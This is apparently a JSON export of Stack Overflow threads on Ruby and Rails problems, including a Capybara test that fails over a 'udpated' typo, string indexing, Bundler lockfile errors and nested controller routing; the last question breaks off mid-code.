[{"tags": ["ruby-on-rails", "ruby", "rspec", "capybara"], "comments": [{"owner": {"reputation": 4600, "user_id": 5961578, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/df7cbfdd2a92a7926af3bbb8648318aa?s=128&d=identicon&r=PG", "display_name": "moveson", "link": "https://stackoverflow.com/users/5961578/moveson"}, "edited": false, "score": 0, "creation_date": 1511999792, "post_id": 47563688, "comment_id": 82085577, "body": "Maybe it can&#39;t find it because the page says &quot;udpated&quot; instead of &quot;updated&quot;?"}], "answers": [{"comments": [{"owner": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "edited": false, "score": 0, "creation_date": 1512000332, "post_id": 47563829, "comment_id": 82085738, "body": "Now <i>that&#39;s</i> some fine transposition spotting! +1"}], "tags": [], "owner": {"reputation": 4600, "user_id": 5961578, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/df7cbfdd2a92a7926af3bbb8648318aa?s=128&d=identicon&r=PG", "display_name": "moveson", "link": "https://stackoverflow.com/users/5961578/moveson"}, "is_accepted": true, "score": 2, "last_activity_date": 1511999964, "creation_date": 1511999964, "answer_id": 47563829, "question_id": 47563688, "link": "https://stackoverflow.com/questions/47563688/rspec-capybara-checking-concatenated-string-of-entire-content-of-page-for-expec/47563829#47563829", "title": "Rspec/Capybara checking concatenated string of entire content of page, for expected string", "body": "<p>The problem is in your #updated action:</p>\n\n<pre><code>  def update\n    @product = Product.find(params[:id])\n    if @product.update(product_params)\n      flash[:notice] = \"Product details have been udpated.\"\n      render :edit\n    else\n      render :edit\n    end\n  end\n</code></pre>\n\n<p>Change your flash notice from \"udpated\" to \"updated\" and you should be good to go.</p>\n"}], "owner": {"reputation": 89, "user_id": 8251690, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ogWgy.jpg?s=128&g=1", "display_name": "Sarah Lindmar", "link": "https://stackoverflow.com/users/8251690/sarah-lindmar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 143, "favorite_count": 0, "accepted_answer_id": 47563829, "answer_count": 1, "score": 1, "last_activity_date": 1511999964, "creation_date": 1511998867, "question_id": 47563688, "link": "https://stackoverflow.com/questions/47563688/rspec-capybara-checking-concatenated-string-of-entire-content-of-page-for-expec", "title": "Rspec/Capybara checking concatenated string of entire content of page, for expected string", "body": "<p>I am testing the process of editing products in a rails app. The process is working as expected on my site and all other similar specs are passing. In this instance, when I tell Capybara to expect a string \"Product details have been updated\" on the page after the form is submitted, it is looking inside another string that is comprised of all of the content on the page concatenated together. Please see the message I'm getting from rspec below and let me know if you need any more information. As you can see, my string is showing up on the page, but rspec can't pick it out.</p>\n\n<p>Message from rspec:</p>\n\n<pre><code>  1) edit a product process edits a product \n   Failure/Error: expect(page).to have_content \"Product details have \n   been updated.\"\n   expected to find text \"Product details have been updated.\" in \n   \"Welcome to Mario's Specialty Food Products See all products Return \n    to Home Update Hot Dog Product details have been udpated. Name Cost \n    Country Back to Product Page\"\n</code></pre>\n\n<p>The failing spec:</p>\n\n<pre><code>    require 'rails_helper'\n\n  describe \"edit a product process\" do\n    it \"edits a product \" do\n      product = Product.create(:name =&gt; \"Hot Dog\", :cost =&gt; 10, :country =&gt; \"United States\")\n      visit products_path\n      click_link 'See all products'\n      click_link product.name\n      click_on \"Edit Product Details\"\n      fill_in \"Cost\", :with =&gt; 7\n      click_on \"submit\"\n      expect(page).to have_content \"Product details have been updated.\"\n    end\n  end\n</code></pre>\n\n<p>The controller:</p>\n\n<pre><code>    class ProductsController &lt; ApplicationController\n\n  def edit\n    @product = Product.find(params[:id])\n  end\n\n  def update\n    @product = Product.find(params[:id])\n    if @product.update(product_params)\n      flash[:notice] = \"Product details have been udpated.\"\n      render :edit\n    else\n      render :edit\n    end\n  end\n</code></pre>\n\n<p>The view:</p>\n\n<pre><code>    &lt;div class='card'&gt;\n      &lt;h3&gt;Update &lt;%= @product.name%&gt;&lt;/h3&gt;\n      &lt;p&gt;&lt;%= flash[:notice] %&gt;&lt;/p&gt;\n      &lt;%= render 'form' %&gt;\n      &lt;%= link_to 'Back to Product Page', product_path(@product) %&gt;\n    &lt;/div&gt;\n</code></pre>\n"}, {"tags": ["ruby"], "answers": [{"tags": [], "owner": {"reputation": 380, "user_id": 8016768, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c39bfe45a303d7156e630c1bbaa3eb9b?s=128&d=identicon&r=PG&f=1", "display_name": "chemical", "link": "https://stackoverflow.com/users/8016768/chemical"}, "is_accepted": false, "score": 0, "last_activity_date": 1512074108, "last_edit_date": 1512074108, "creation_date": 1512072777, "answer_id": 47581816, "question_id": 47563300, "link": "https://stackoverflow.com/questions/47563300/increment-number-but-skip-the-first-time-ruby/47581816#47581816", "title": "Increment Number but skip the first time Ruby", "body": "<pre><code>offset = 0\nfirst_loop = true\nloop do \n  offset += 1 unless first_loop\n\n  code here\n\n  first_loop = false\nend\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 7565, "user_id": 1021515, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/Z9QcP.jpg?s=128&g=1", "display_name": "mwp", "link": "https://stackoverflow.com/users/1021515/mwp"}, "is_accepted": false, "score": 1, "last_activity_date": 1512075957, "creation_date": 1512075957, "answer_id": 47582623, "question_id": 47563300, "link": "https://stackoverflow.com/questions/47563300/increment-number-but-skip-the-first-time-ruby/47582623#47582623", "title": "Increment Number but skip the first time Ruby", "body": "<p>There are a number of issues with your attempt. First of all, your statement <code>if offset = 0</code> isn't checking if <code>offset</code> equals zero, it's <em>setting</em> it to zero. To check for equality, use <code>==</code>:</p>\n\n<p>Secondly, even if you fix the first issue, the <code>else</code> of your condition will <em>never</em> fire, because <code>offset</code> will always be zero and therefore never incremented.</p>\n\n<p>Third, if you have nothing to do in an <code>if</code> block, you don't need to put <code>nil</code>, just skip directly to the <code>else</code>:</p>\n\n<pre><code>  if offset == 0 \n  else\n    offset += 1 \n  end\n</code></pre>\n\n<p>Even better, just negate the expression and skip the <code>else</code> entirely:</p>\n\n<pre><code>  if offset != 0 \n    offset += 1 \n  end\n</code></pre>\n\n<p>Also, <code>while do</code> isn't a valid Ruby construct. You can either write something like <code>while true do</code> or use <code>loop do</code>. </p>\n\n<p>More generally speaking, if you need to execute some code before the offset is incremented, just put that code <em>before</em> the offset is incremented:</p>\n\n<pre><code>offset = 0\nloop do \n  # your code goes here\n\n  offset += 1 \nend\n</code></pre>\n\n<p>And here's a more \"Ruby-ish\" way to do it:</p>\n\n<pre><code>0.step do |offset|\n  # your code goes here\nend\n</code></pre>\n\n<p>Hope this helps.</p>\n"}], "owner": {"reputation": 11, "user_id": 8922299, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/b6c287879dbecfc176e68da4399c96e6?s=128&d=identicon&r=PG&f=1", "display_name": "Yeager", "link": "https://stackoverflow.com/users/8922299/yeager"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1512075957, "creation_date": 1511996486, "last_edit_date": 1512075428, "question_id": 47563300, "link": "https://stackoverflow.com/questions/47563300/increment-number-but-skip-the-first-time-ruby", "title": "Increment Number but skip the first time Ruby", "body": "<p>I need to set a loop that increments a variable but doesn't do it the first time around. This is the code, I know I'm close so I'm hoping for some guidance. </p>\n\n<pre><code>offset = 0\nwhile do \n  if offset = 0 \n    nil\n  else\n    offset += 1 \n  end \nend\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "selenium", "cucumber", "google-chrome-headless"], "answers": [{"tags": [], "owner": {"reputation": 145, "user_id": 5499495, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/78c36ef33ae7f37371ec95976075733b?s=128&d=identicon&r=PG&f=1", "display_name": "user43395", "link": "https://stackoverflow.com/users/5499495/user43395"}, "is_accepted": false, "score": 0, "last_activity_date": 1511997428, "creation_date": 1511997428, "answer_id": 47563467, "question_id": 47563049, "link": "https://stackoverflow.com/questions/47563049/find-a-dynamic-input-tag-with-capybara-selenium/47563467#47563467", "title": "Find a dynamic &lt;input&gt; tag with Capybara/Selenium", "body": "<p>Looks like</p>\n\n<p>label_element.find(:xpath, '//input') did it! </p>\n"}], "owner": {"reputation": 145, "user_id": 5499495, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/78c36ef33ae7f37371ec95976075733b?s=128&d=identicon&r=PG&f=1", "display_name": "user43395", "link": "https://stackoverflow.com/users/5499495/user43395"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 51, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1511997428, "creation_date": 1511995218, "question_id": 47563049, "link": "https://stackoverflow.com/questions/47563049/find-a-dynamic-input-tag-with-capybara-selenium", "title": "Find a dynamic &lt;input&gt; tag with Capybara/Selenium", "body": "<p>I have the following HTML:</p>\n\n<pre><code>&lt;label for=\"file-input-76eb2\" id=\"ember3042\" class=\"c-text-input c-text-input o-grid-cell--6 file-upload ember-view\"&gt;\n  &lt;input id=\"file-input-76eb2\" type=\"file\" accept=\"text/csv\" style=\"display: none;\"&gt;\n  &lt;span class=\"c-file-upload__input-filename\"&gt;&lt;/span&gt;\n  &lt;a class=\"c-button c-button--single-action-primary c-file-upload__input-button\"&gt;\n      Select\n  &lt;/a&gt;\n&lt;/label&gt;\n</code></pre>\n\n<p>I have managed to get a Capybara::Node:Element corresponding to the label tag, but I can't get to the input. The id is dynamic- constantly changing. Moreover, I need to upload a file to this input tag. </p>\n\n<p>Is there any information what I can do? This is all using google-chrome-headless.</p>\n\n<p>This is using Ruby, with Capybara, with Selenium.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "ruby-on-rails-3", "bundler", "gemfile"], "comments": [{"owner": {"reputation": 2276, "user_id": 4164651, "user_type": "registered", "accept_rate": 65, "profile_image": "https://graph.facebook.com/100004012909097/picture?type=large", "display_name": "Edmund Lee", "link": "https://stackoverflow.com/users/4164651/edmund-lee"}, "edited": false, "score": 0, "creation_date": 1512004129, "post_id": 47561533, "comment_id": 82086729, "body": "Try <code>gem uninstall less-rails</code>. Then run <code>bundle install</code> again."}, {"owner": {"reputation": 196, "user_id": 119578, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bd2501fc90741eee27a99275aa751f85?s=128&d=identicon&r=PG", "display_name": "seigel", "link": "https://stackoverflow.com/users/119578/seigel"}, "reply_to_user": {"reputation": 2276, "user_id": 4164651, "user_type": "registered", "accept_rate": 65, "profile_image": "https://graph.facebook.com/100004012909097/picture?type=large", "display_name": "Edmund Lee", "link": "https://stackoverflow.com/users/4164651/edmund-lee"}, "edited": false, "score": 0, "creation_date": 1512170962, "post_id": 47561533, "comment_id": 82164644, "body": "I will try.  I do start from scratch each time. I&#39;ll report back if anything is found!"}], "owner": {"reputation": 196, "user_id": 119578, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bd2501fc90741eee27a99275aa751f85?s=128&d=identicon&r=PG", "display_name": "seigel", "link": "https://stackoverflow.com/users/119578/seigel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 160, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1511988393, "creation_date": 1511988393, "question_id": 47561533, "link": "https://stackoverflow.com/questions/47561533/ruby-bundler-version-dependency-confusion-in-lockfile", "title": "Ruby Bundler Version Dependency Confusion in Lockfile", "body": "<p>I will try and keep this focused.</p>\n\n<p>When trying to move from a <strong>working</strong> bundler 1.14.6 combined with a <strong>Gemfile</strong> + <strong>Gemfile.lock</strong> to 1.15.2 or higher I ran into some failures in our old project's install. We believe that the failure is caused from a <strong>Gemfile.lock</strong> that is specified in a way that stricter parsing in 1.15.x and higher doesn't like. (found a vague reference to this in an issue posted somewhere on github, lost the reference.  Manual resolution was recommended)</p>\n\n<p>On the road to trying to fix it I am faced with trying to understand WHY it is failing and WHAT this has to do with it.</p>\n\n<p>The error I am currently working on is shown below:</p>\n\n<pre><code>Downloading twitter-bootstrap-rails-2.1.0 revealed dependencies not in the API\nor the lockfile (therubyracer (~&gt; 0.10.1), less-rails (~&gt; 2.2.2)).\n</code></pre>\n\n<p>Focussing on the less-rails problem, when I do a</p>\n\n<pre><code>gem list\n</code></pre>\n\n<p>I get the indication that less-rails is already at 2.2.4.</p>\n\n<pre><code>less-rails (2.2.4)\n</code></pre>\n\n<p>Why isn't the specified <strong>less-rails (~> 2.2.2)</strong> not happy with the <strong>2.2.4</strong> that is installed?</p>\n\n<p>Please help me understand so I can take a run at fixing the other issues popping up.</p>\n\n<p>Here is the gemfile and gemfile.lock that exhibits the problem.</p>\n\n<p>Really struggling to understand this one, any help is appreciated.\nThanks!</p>\n"}, {"tags": ["ruby", "while-loop", "whitespace"], "comments": [{"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 1, "creation_date": 1511987288, "post_id": 47561143, "comment_id": 82080150, "body": "Why do you split <code>string[idx]</code>? This gets you single char string, there&#39;s nothing to split. And yes, this is the error."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1511990565, "post_id": 47561143, "comment_id": 82081836, "body": "There are no &quot;even&quot; values in a string. I believe you mean &quot;return all characters in a string whose indices are even&quot;? Now, what do you mean by &quot;return&quot;? If <code>str = &#39;abcde&#39;, do you men to return the string </code>&#39;ace&#39;<code>, the array </code>[&#39;a&#39;, &#39;c&#39;, &#39;e&#39;]` or something else. Be precise!"}, {"owner": {"reputation": 31, "user_id": 8853127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2291a5866c2b08a3d3a83c93970d9c51?s=128&d=identicon&r=PG&f=1", "display_name": "Mike Barnes", "link": "https://stackoverflow.com/users/8853127/mike-barnes"}, "edited": false, "score": 0, "creation_date": 1511990902, "post_id": 47561143, "comment_id": 82081995, "body": "Thanks Sergio. I used split because I&#39;m new to ruby and was trying a few different things and the code worked when I tried split, except for including the spaces. Thanks to your comment I see if I just change split to split(&#39;&#39;) it will pass all 3 tests. Of course it&#39;s still unnecessary and I should clean up my code which I&#39;ll do instead. For reference without split, the exact code posted produces this error message:  no implicit conversion of String into Array (repl):13:in <code>every_other_letter&#39; (repl):21:in </code>&lt;main&gt;&#39;"}, {"owner": {"reputation": 31, "user_id": 8853127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2291a5866c2b08a3d3a83c93970d9c51?s=128&d=identicon&r=PG&f=1", "display_name": "Mike Barnes", "link": "https://stackoverflow.com/users/8853127/mike-barnes"}, "reply_to_user": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1511990974, "post_id": 47561143, "comment_id": 82082028, "body": "@CarySwoveland the instructions are in the code, but basically yes it would turn &quot;abcde&quot; into &quot;ace&quot;."}, {"owner": {"reputation": 9030, "user_id": 5101476, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JCQrl.jpg?s=128&g=1", "display_name": "ice\u30c4", "link": "https://stackoverflow.com/users/5101476/ice%e3%83%84"}, "edited": false, "score": 0, "creation_date": 1512017188, "post_id": 47561143, "comment_id": 82089895, "body": "<code>&#39;hello&#39;.chars.each_slice(2).map(&amp;:first).join #=&gt; &quot;hlo&quot;</code> is another way."}], "answers": [{"comments": [{"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511987306, "post_id": 47561240, "comment_id": 82080156, "body": "This is not how split is used there."}, {"owner": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "reply_to_user": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511987837, "post_id": 47561240, "comment_id": 82080422, "body": "I see, by pushing the string[idx] to final it&#39;s okay, and returns the expected output, will you create an answer @Sergio?"}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511988321, "post_id": 47561240, "comment_id": 82080679, "body": "Nah, I hinted at this in the comments. My job here is done :)"}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511988869, "post_id": 47561240, "comment_id": 82080968, "body": "&quot;you&#39;re &quot;converting&quot; that letter in an array&quot; - this isn&#39;t THE problem, btw. :) concatenation of multiple arrays works."}, {"owner": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "reply_to_user": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 1, "creation_date": 1511989412, "post_id": 47561240, "comment_id": 82081247, "body": "With <code>&#39;a&#39;.split # =&gt; [&#39;a&#39;]</code>, and <code>&#39; &#39;.split # =&gt; []</code>, so there are no whitespaces to join, no?, how is it?"}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1511989991, "post_id": 47561240, "comment_id": 82081569, "body": "yep, that&#39;s it. So combine this with your original remart (split discards whitespace), and you got yourself a good answer :)"}, {"owner": {"reputation": 31, "user_id": 8853127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2291a5866c2b08a3d3a83c93970d9c51?s=128&d=identicon&r=PG&f=1", "display_name": "Mike Barnes", "link": "https://stackoverflow.com/users/8853127/mike-barnes"}, "edited": false, "score": 0, "creation_date": 1511991486, "post_id": 47561240, "comment_id": 82082244, "body": "@SebastianPalma Your simplified code works much better so thank you. I still have a limited understanding of &quot;&lt;&lt;&quot; which is why I didn&#39;t use it in my code."}, {"owner": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "edited": false, "score": 0, "creation_date": 1511991574, "post_id": 47561240, "comment_id": 82082289, "body": "It &quot;pushes&quot; to the end of the array a new element. See <a href=\"https://stackoverflow.com/questions/10569529/ruby-difference-between-array-and-arraypush\">this</a> for more info."}], "tags": [], "owner": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "is_accepted": false, "score": 2, "last_activity_date": 1511992942, "last_edit_date": 1511992942, "creation_date": 1511987238, "answer_id": 47561240, "question_id": 47561143, "link": "https://stackoverflow.com/questions/47561143/ruby-how-to-keep-white-spaces-when-returning-all-even-values-in-a-string/47561240#47561240", "title": "Ruby - How to keep white spaces when returning all even values in a string?", "body": "<p>The problem is, as pointed @Sergio, that you're using split over a single char, so, you're \"converting\" that letter in an array. What you can do is just to push the <code>string[idx]</code> to final and it works for you that way.</p>\n\n<p>In other way you could split the string, using select get the chars where the index is even, and then join them:</p>\n\n<pre><code>p \"an apple a day...\".chars.select.with_index { |_, i| i.even?  }.join == \"a pl  a..\" # true\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "is_accepted": false, "score": 4, "last_activity_date": 1511992860, "creation_date": 1511992860, "answer_id": 47562590, "question_id": 47561143, "link": "https://stackoverflow.com/questions/47561143/ruby-how-to-keep-white-spaces-when-returning-all-even-values-in-a-string/47562590#47562590", "title": "Ruby - How to keep white spaces when returning all even values in a string?", "body": "<p>Just another way to get all even-index characters, using a regular expression to grab pairs and replacing each pair by just its first character:</p>\n\n<pre><code>\"abcd fghi\".gsub(/(.)./, '\\1')\n=&gt; \"ac gi\"\n</code></pre>\n\n<p>Or find them and join them:</p>\n\n<pre><code>\"abcd fghi\".scan(/(.).?/).join\n=&gt; \"ac gi\"\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 8853127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2291a5866c2b08a3d3a83c93970d9c51?s=128&d=identicon&r=PG&f=1", "display_name": "Mike Barnes", "link": "https://stackoverflow.com/users/8853127/mike-barnes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 394, "favorite_count": 0, "answer_count": 2, "score": 3, "last_activity_date": 1511992942, "creation_date": 1511986878, "last_edit_date": 1511987038, "question_id": 47561143, "link": "https://stackoverflow.com/questions/47561143/ruby-how-to-keep-white-spaces-when-returning-all-even-values-in-a-string", "title": "Ruby - How to keep white spaces when returning all even values in a string?", "body": "<p>I'm trying to make a code that returns all the even values in a string. The code I created seems to do that, but it won't return the white spaces and so the final test fails. Can someone help me to understand why it returns all the letters, but none of the whitespaces? </p>\n\n<pre><code># Every Other Letter Define a method, #every_other_letter(string), \n# that accepts a string as an argument. This method should return a \n# new string that contains every other letter of the original string, \n# starting with the first character. Treat white-space and punctuation \n# the same as letters.\n\ndef every_other_letter(string)\n  idx = 0\n  final = []\n\n  while idx &lt; string.length \n    letters = string[idx].split\n    final = final + letters\n    idx = idx + 2\n  end\n\n  p final = final.join\nend\n\nputs \"------Every Other Letter------\"\nputs every_other_letter(\"abcde\") == \"ace\"\nputs every_other_letter(\"i heart ruby\") == \"ihatrb\"\nputs every_other_letter(\"an apple a day...\") == \"a pl  a..\"\n</code></pre>\n\n<p>and this returns:</p>\n\n<pre><code>------Every Other Letter------\n\"ace\"\ntrue\n\"ihatrb\"\ntrue\n\"apla..\"\nfalse\n=&gt; nil\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 35, "user_id": 1922225, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/69bcdf87079d9fd805f119c1bf2a96ee?s=128&d=identicon&r=PG", "display_name": "merovingian", "link": "https://stackoverflow.com/users/1922225/merovingian"}, "edited": false, "score": 0, "creation_date": 1511987123, "post_id": 47561046, "comment_id": 82080074, "body": "Sorry, the very last code example, &quot;class&quot; is actually not capitalized, missed that in my question creation."}], "answers": [{"tags": [], "owner": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "is_accepted": true, "score": 0, "last_activity_date": 1511989529, "creation_date": 1511989529, "answer_id": 47561780, "question_id": 47561046, "link": "https://stackoverflow.com/questions/47561046/nested-controllers-class-definitions-under-parent-directory/47561780#47561780", "title": "Nested controllers class definitions under parent directory", "body": "<pre><code>app/features/rsyslog/inputs_controller.rb\n</code></pre>\n\n<p>Should define</p>\n\n<pre><code>class Features::Rsyslog::InputsController &lt; ApplicationController\n  ...\nend\n</code></pre>\n\n<p>Not </p>\n\n<pre><code>class Features::Rsyslog::RsyslogInputsController &lt; ApplicationController\n  ...\nend\n</code></pre>\n\n<p>Then: </p>\n\n<pre><code>scope :features do\n  scope :rsyslog do\n    resources :inputs,  controller: 'features/rsyslog/inputs'\n    resources :outputs, controller: 'features/rsyslog/outputs'\n    resources :rules,   controller: 'features/rsyslog/rules'\n  end\nend\n</code></pre>\n\n<p>Which yields:</p>\n\n<pre><code>      inputs GET    /features/rsyslog/inputs(.:format)              features/rsyslog/inputs#index\n             POST   /features/rsyslog/inputs(.:format)              features/rsyslog/inputs#create\n   new_input GET    /features/rsyslog/inputs/new(.:format)          features/rsyslog/inputs#new\n  edit_input GET    /features/rsyslog/inputs/:id/edit(.:format)     features/rsyslog/inputs#edit\n       input GET    /features/rsyslog/inputs/:id(.:format)          features/rsyslog/inputs#show\n             PATCH  /features/rsyslog/inputs/:id(.:format)          features/rsyslog/inputs#update\n             PUT    /features/rsyslog/inputs/:id(.:format)          features/rsyslog/inputs#update\n             DELETE /features/rsyslog/inputs/:id(.:format)          features/rsyslog/inputs#destroy\n     outputs GET    /features/rsyslog/outputs(.:format)             features/rsyslog/outputs#index\n             POST   /features/rsyslog/outputs(.:format)             features/rsyslog/outputs#create\n  new_output GET    /features/rsyslog/outputs/new(.:format)         features/rsyslog/outputs#new\n edit_output GET    /features/rsyslog/outputs/:id/edit(.:format)    features/rsyslog/outputs#edit\n      output GET    /features/rsyslog/outputs/:id(.:format)         features/rsyslog/outputs#show\n             PATCH  /features/rsyslog/outputs/:id(.:format)         features/rsyslog/outputs#update\n             PUT    /features/rsyslog/outputs/:id(.:format)         features/rsyslog/outputs#update\n             DELETE /features/rsyslog/outputs/:id(.:format)         features/rsyslog/outputs#destroy\n       rules GET    /features/rsyslog/rules(.:format)               features/rsyslog/rules#index\n             POST   /features/rsyslog/rules(.:format)               features/rsyslog/rules#create\n    new_rule GET    /features/rsyslog/rules/new(.:format)           features/rsyslog/rules#new\n   edit_rule GET    /features/rsyslog/rules/:id/edit(.:format)      features/rsyslog/rules#edit\n        rule GET    /features/rsyslog/rules/:id(.:format)           features/rsyslog/rules#show\n             PATCH  /features/rsyslog/rules/:id(.:format)           features/rsyslog/rules#update\n             PUT    /features/rsyslog/rules/:id(.:format)           features/rsyslog/rules#update\n             DELETE /features/rsyslog/rules/:id(.:format)           features/rsyslog/rules#destroy\n</code></pre>\n"}], "owner": {"reputation": 35, "user_id": 1922225, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/69bcdf87079d9fd805f119c1bf2a96ee?s=128&d=identicon&r=PG", "display_name": "merovingian", "link": "https://stackoverflow.com/users/1922225/merovingian"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 36, "favorite_count": 0, "accepted_answer_id": 47561780, "answer_count": 1, "score": 0, "last_activity_date": 1511989529, "creation_date": 1511986502, "question_id": 47561046, "link": "https://stackoverflow.com/questions/47561046/nested-controllers-class-definitions-under-parent-directory", "title": "Nested controllers class definitions under parent directory", "body": "<p>Quick question, I\u2019m building a rails app that has the ability to contain multiple \u201cfeatures\u201d one of those being rsyslog, other features could be any other software. Below is the current construct: </p>\n\n<p><strong>Controllers:</strong> </p>\n\n<pre><code>features/\nfeatures/rsyslog/\nfeatures/rsyslog/rsyslog_inputs_controller.rb\nfeatures/rsyslog/rsyslog_outputs_controller.rb\nfeatures/rsyslog/rsyslog_rules_controller.rb\n</code></pre>\n\n<p><strong>Routes:</strong> </p>\n\n<pre><code>resources :features do\n  scope module: \"features/rsyslog\u201d do\n    resources :rsyslog_inputs\n    resources :rsyslog_outputs\n    resources :rsyslog_rules\n  end\nend\n</code></pre>\n\n<p><em>(controller code does not work here)</em></p>\n\n<p><strong>Controller code:</strong>  </p>\n\n<pre><code>class Features::RsyslogInputsController &lt; ApplicationController;end\nclass Features::RsyslogOutputsController &lt; ApplicationController;end\nclass 